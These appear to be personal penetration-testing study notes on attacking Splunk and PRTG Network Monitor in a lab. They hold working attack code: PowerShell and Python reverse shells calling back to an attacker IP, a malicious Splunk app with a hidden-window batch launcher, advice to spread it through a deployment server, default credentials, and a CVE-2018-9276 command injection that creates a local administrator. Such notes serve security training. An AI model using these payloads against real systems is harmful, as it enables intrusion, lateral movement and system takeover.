## 1- Splunk - Discovery & Enumeration

Splunk is a log analytics platform used for monitoring, security, and data visualization. It often contains sensitive data and appears frequently during internal pentests. Splunk rarely has serious vulnerabilities, so attacks usually rely on **weak/null authentication** or abusing **built-in features** like scripted inputs for RCE.
- Few historical CVEs (mainly info disclosure and old RCE).
**Why Splunk Matters in Pentests?:**
- Common in large networks.
- Sometimes exposed externally (rare).
- Admin access = ability to deploy custom apps → fast compromise.
- Free version (trial expired) **has no authentication**, creating a major security risk.
####  Discovery / Footprinting
Splunk usually runs on:
- **Port 8000** → Splunk Web
- **Port 8089** → Splunk management  for communication with the Splunk REST API.
```bash
nmap site.com -p 8000,8089
  # 8000/tcp open  ssl/http      Splunkd httpd
  # 8089/tcp open  ssl/http      Splunkd httpd
```

- ==Older versions used default credentials:==   `admin:changeme`
- If not valid, test weak passwords like:`admin / Welcome / Welcome1 / Password123`
## Enumeration
- **If Splunk Enterprise Trial expires** → becomes **Splunk Free** after 60 days , which requires **no login**.   Admins often forget test installations, leaving them exposed.

Once inside Splunk (even without auth), an attacker can:
- Browse data & dashboards
- Install apps from Splunkbase
- Upload custom apps
- Create **scripted inputs** → used for **remote code execution (RCE)**

**Key RCE Method: Scripted Inputs:**
Splunk allows running:
- Bash scripts
- PowerShell
- Batch
- Python (installed by default)
Attackers can create a scripted input that runs a **reverse shell Python script**.

 **Known Vulnerabilities:**
- Past SSRF vulnerability enabling REST API access.
- Around 47 CVEs, most not directly exploitable.
- Abusing built-in features (like scripted inputs) is the main attack path.



---

## 2- Attacking Splunk
Once authenticated (or when Splunk Free requires no auth), we can gain **remote code execution (RCE)** by uploading a **custom Splunk app**. Splunk executes scripts through _scripted inputs_, which can run Python, PowerShell, Bash, or Batch.  
From Nmap we know the target is **Windows**, and Splunk bundles **Python**, so both **Python** and **PowerShell** shells work.

#### Abusing Built-In Functionality
We create a **custom Splunk application** containing:

- A reverse shell script (PowerShell or Python)
- `inputs.conf` telling Splunk to run the script
- A `.bat` wrapper for Windows
 Directory structure:
```bash
├── bin
│   ├── rev.py
│   ├── run.bat
│   └── run.ps1
└── default
    └── inputs.conf
```

**Step 1  edit the  Reverse Shell (PowerShell)** in `bin/run.ps1` (edit IP + port):
```powershell
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
**Step 2  Configure inputs.conf:** in `default/input.conf` Tells Splunk to execute scripts at intervals (every **10 seconds**).
```bash
cat default/inputs.conf
  # Run Python script
  [script://./bin/rev.py]
  disabled = 0
  interval = 10
  sourcetype = shell

  # Run PowerShell via .bat
  [script://.\bin\run.bat]
  disabled = 0
  interval = 10
  sourcetype = shell
```
**Step 3  Batch file to launch PowerShell reverse shell**  We need the .bat file `bin/run.bat` , which will run when the application is deployed and execute the PowerShell one-liner so keep it as it is. 
```bash
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```
***Step 4  Create the malicious app archive***
```bash
tar -cvzf updater.tar.gz splunk_shell/
  # includes rev.py, run.bat, run.ps1, inputs.conf
```
**Step 5  Upload App** From Splunk Web:
- Apps → **Install app from file**
- Upload `updater.tar.gz`
![[Pasted image 20251204223439.png]]
![[Pasted image 20251204223444.png]]
**Step 6  Start Listener**
```bash
sudo nc -lnvp 443
  # whoami >> nt authority\system
```
Once the Splunk app is installed → Splunk executes the scripts → Reverse shell fires
**Privilege:** SYSTEM  
Now you can enumerate credentials, pivot in the domain, dump secrets, etc.

**Linux Version (Python Shell):** 
    If Splunk runs on Linux,we would need to edit the `rev.py` Python script before creating the compressed archive (.tar.gz).  and uploading the custom malicious app. The rest of the process would be the same, and we would get a reverse shell connection on our Netcat listener and be off to the races.
```python
import sys,socket,os,pty
ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

**Deployment Server → Compromise More Hosts**
    If the compromised Splunk system is a **deployment server**, place your malicious app here:
```
$SPLUNK_HOME/etc/deployment-apps/
```
All connected **Universal Forwarders** will receive and execute it.  
> On Windows forwarders, use **PowerShell reverse shells** (they don’t include Python).


----
## 3- PRTG Network Monitor
[PRTG](https://www.paessler.com/prtg) is agentless network monitoring software for bandwidth, uptime, and device stats. It supports ICMP, SNMP, WMI, NetFlow, and REST API. Often seen in internal pentests, it can be vulnerable to **authenticated command injection** in older versions.


#### Discovery/Footprinting/Enumeration
PRTG typically runs on:

- **Port 80 / 443 / 8080** (web interface)
```bash
sudo nmap -sV -p- --open 10.129.201.50
  # 8080/tcp open  http  Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
```

- Default credentials often pre-filled: `prtgadmin:prtgadmin` if fail try others creds (ex.`prtgadmin:Password123`)
- Vulnerable version detected via Nmap or cURL:
```bash
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
  # PRTG Network Monitor 17.3.33.2830
```

- Login attempts with common weak passwords (`prtgadmin:prtgadmin`, `prtgadmin:Password123`) often succeed.
- PRTG interface shows monitoring dashboard and system info once logged in.
#### Leveraging Known Vulnerabilities

**Authenticated Command Injection (CVE-2018-9276)**

- Located in **Notifications → Add new notification 
![[Pasted image 20251204235153.png]]  
 ![[Pasted image 20251204235211.png]]

Give the notification a name and scroll down and tick the box next to `EXECUTE PROGRAM`.
 `Program File`, select `Demo exe notification - outfile.ps1` from the drop-down. Finally, in the parameter field, enter a command
For our purposes, we will add a new local admin user by entering `test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add`. During an actual assessment, we may want to do something that does not change the system, such as getting a reverse shell or connection to our favorite C2. Finally, click the `Save` button.
![[Pasted image 20251204235425.png]]
**Example: Add local admin via notification**
```bash
# Parameter field:
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```

- Save & **Test** notification → command executed blindly
![[Pasted image 20251205000926.png]]
- Blind execution → check via CrackMapExec, RDP, WinRM, evil-winrm, or impacket tools
```bash
sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
  # [+] APP03\prtgadm1:Pwn3d!  → confirms local admin access
```

or check our listener for a connection back if we set up reverse shell command in the parameter